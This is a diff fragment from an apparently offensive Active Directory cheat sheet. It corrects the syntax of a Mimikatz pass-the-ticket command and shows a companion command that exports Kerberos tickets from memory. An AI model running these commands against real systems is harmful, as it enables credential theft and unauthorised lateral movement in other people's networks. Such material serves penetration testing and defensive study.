@@ -924,7 +924,7 @@ Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
 
 #### Reuse the TGT ticket
 ```
-Invoke-Mimikatz -Command '"kerberos:ptt"' <kirbi file>
+Invoke-Mimikatz -Command '"kerberos::ptt <kirbi file>"'
 ```
 
 ## Constrained Delegation
